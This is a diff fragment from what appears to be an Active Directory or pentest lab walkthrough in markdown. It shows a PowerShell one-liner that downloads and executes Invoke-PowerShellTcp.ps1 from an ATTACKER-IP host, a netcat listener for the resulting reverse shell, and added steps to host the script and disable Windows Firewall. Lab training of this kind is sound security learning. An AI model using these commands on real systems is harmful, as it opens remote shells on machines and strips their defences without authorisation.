@@ -113,10 +113,16 @@ powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1
 $ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 ```
 
-Also we need to host our `Invoke-PowerShellTcp.ps1` script as stated in the payload, we can use a tool called **HTTP File Server (HFS)** or just try to google what works for you (Drag and drop the `Invoke-PowerShellTcp.ps1` to the left pane )
+- Also we need to host our `Invoke-PowerShellTcp.ps1` script as stated in the payload, we can use a tool called **HTTP File Server (HFS)** or just try to google what works for you (Drag and drop the `Invoke-PowerShellTcp.ps1` to the left pane )
 
 
 ![](https://i.imgur.com/0MnoHoT.png)
+
+- We also need to turn off windows firewall for this to work, so do that also
+
+
+![](https://i.imgur.com/ksH2Ukn.png)
+
 
 
  
